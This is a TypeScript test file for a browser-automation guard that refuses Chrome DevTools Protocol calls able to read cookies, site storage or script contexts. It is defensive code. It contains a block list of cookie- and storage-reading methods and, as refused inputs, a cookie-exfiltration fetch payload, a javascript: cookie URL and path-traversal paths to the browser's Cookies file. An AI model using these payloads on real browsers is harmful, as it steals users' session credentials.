import { readdirSync, readFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { CDP_ALLOWED, CdpRefused, type CdpTransport, checkCdpCall, GuardedCdp, navigable } from "./cdp-guard.ts";

const CFG = { downloadDir: "/profile/.localdot-downloads", uploadDir: "/tmp/localdot/uploads" };

function fakeTransport() {
  const written: string[] = [];
  let deliver: (m: string) => void = () => {};
  const t: CdpTransport = {
    write: (m) => written.push(m),
    onMessage: (l) => {
      deliver = l;
    },
    onClose: () => {},
    close: () => {},
  };
  return { t, written, deliver: (m: unknown) => deliver(JSON.stringify(m)) };
}

// Review Focus 1: nothing in the signed-in browser's cookies or site storage can be read through
// browserd, because browserd cannot ask for it. Each of these would expose a cookie, page storage
// or a script context that can read both.
const FORBIDDEN = [
  "Runtime.evaluate",
  "Runtime.callFunctionOn",
  "Runtime.compileScript",
  "Runtime.enable",
  "Network.enable",
  "Network.getCookies",
  "Network.getAllCookies",
  "Network.getResponseBody",
  "Network.setCookie",
  "Storage.getCookies",
  "Storage.getStorageKeyForFrame",
  "Storage.getSharedStorageEntries",
  "DOMStorage.enable",
  "DOMStorage.getDOMStorageItems",
  "IndexedDB.requestData",
  "CacheStorage.requestEntries",
  "Fetch.enable",
  "Fetch.continueRequest",
  "Page.addScriptToEvaluateOnNewDocument",
  "Page.captureScreenshot",
  "Page.printToPDF",
  "Page.createIsolatedWorld",
  "Target.attachToBrowserTarget",
  "Target.exposeDevToolsProtocol",
  "Target.createBrowserContext",
  "DOM.getOuterHTML",
  "DOM.resolveNode",
  "DOM.setAttributeValue",
  "DOM.querySelectorAll",
  "Input.insertText",
  "Input.dispatchKeyEvent",
  "Debugger.enable",
  "HeapProfiler.takeHeapSnapshot",
  "Tracing.start",
  "Browser.grantPermissions",
  "Emulation.setUserAgentOverride",
  "Audits.enable",
];

describe("the CDP guard (Review Focus 1)", () => {
  it("refuses every cookie, storage, script and interception method before it reaches the pipe", async () => {
    const f = fakeTransport();
    const cdp = new GuardedCdp(f.t, CFG);
    for (const method of FORBIDDEN) {
      expect(CDP_ALLOWED.has(method), method).toBe(false);
      await expect(cdp.send(method, {}, "S1"), method).rejects.toBeInstanceOf(CdpRefused);
    }
    expect(f.written).toEqual([]);
  });

  it("holds allowed methods to their own limits", () => {
    const refused = (method: string, params: Record<string, unknown>) =>
      expect(() => checkCdpCall(method, params, CFG), `${method} ${JSON.stringify(params)}`).toThrow(CdpRefused);
    refused("Page.reload", { scriptToEvaluateOnLoad: "fetch('//x?'+document.cookie)" });
    refused("Page.navigate", { url: "javascript:alert(document.cookie)" });
    refused("Page.navigate", { url: "file:///profile/Default/Cookies" });
    refused("Page.navigate", { url: "chrome://settings/cookies" });
    refused("Page.navigate", { url: "http://127.0.0.1:7700/observe" });
    refused("Page.navigate", { url: "http://[::1]:3000/" });
    refused("Page.navigate", { url: "http://localhost:3129/" });
    refused("Page.navigate", { url: "https://user:pw@example.com/" });
    refused("Target.createTarget", { url: "https://example.com", browserContextId: "x" });
    refused("Target.attachToTarget", { targetId: "T", flatten: false });
    refused("DOM.setFileInputFiles", { files: ["/profile/Default/Cookies"], backendNodeId: 1 });
    refused("DOM.setFileInputFiles", { files: ["/tmp/localdot/uploads/../../../profile/Default/Cookies"], backendNodeId: 1 });
    refused("DOM.setFileInputFiles", { files: ["/tmp/localdot/uploads-evil/x"], backendNodeId: 1 });
    refused("Browser.setDownloadBehavior", { behavior: "allow", downloadPath: "/config/Downloads", eventsEnabled: true });
    refused("Browser.setDownloadBehavior", { behavior: "allowAndName", downloadPath: "/tmp", eventsEnabled: true });
    expect(() => checkCdpCall("Page.navigate", { url: "https://accounts.example.com/login" }, CFG)).not.toThrow();
    expect(() => checkCdpCall("DOM.setFileInputFiles", { files: ["/tmp/localdot/uploads/01J/cv.pdf"], backendNodeId: 6 }, CFG)).not.toThrow();
    expect(() => checkCdpCall("Browser.setDownloadBehavior", { behavior: "allowAndName", downloadPath: CFG.downloadDir, eventsEnabled: true }, CFG)).not.toThrow();
  });

  it("delivers only the events browserd handles", async () => {
    const f = fakeTransport();
    const cdp = new GuardedCdp(f.t, CFG);
    const seen: string[] = [];
    cdp.on("Page.fileChooserOpened", () => seen.push("chooser"));
    expect(() => cdp.on("Network.requestWillBeSentExtraInfo", () => {})).toThrow(CdpRefused);
    f.deliver({ method: "Network.requestWillBeSentExtraInfo", params: { headers: { cookie: "sid=x" } } });
    f.deliver({ method: "Page.fileChooserOpened", params: { backendNodeId: 6 } });
    expect(seen).toEqual(["chooser"]);
    const reply = cdp.send("Page.enable", {}, "S1");
    f.deliver({ id: 1, result: {} });
    await expect(reply).resolves.toEqual({});
  });

  it("sends nothing outside the list anywhere in browserd's source", () => {
    const dir = new URL(".", import.meta.url).pathname;
    const used = new Set<string>();
    for (const file of readdirSync(dir, { recursive: true }) as string[]) {
      if (!file.endsWith(".ts") || file.endsWith(".test.ts")) continue;
      const text = readFileSync(join(dir, file), "utf8");
      for (const m of text.matchAll(/\.send(?:<[^>]*>)?\(\s*"([A-Z][A-Za-z]+\.[A-Za-z]+)"/g)) used.add(m[1] as string);
    }
    expect([...used].filter((m) => !CDP_ALLOWED.has(m))).toEqual([]);
  });

  it("knows what a navigable page is", () => {
    expect(navigable("https://example.com/a?b=c")).toBe(true);
    expect(navigable("http://neverssl.com/")).toBe(true);
    for (const bad of ["https://10.0.0.1/", "https://intranet/", "data:text/html,x", "view-source:https://a.example/", "https://a.example:8443/".repeat(200)])
      expect(navigable(bad), bad).toBe(false);
  });
});
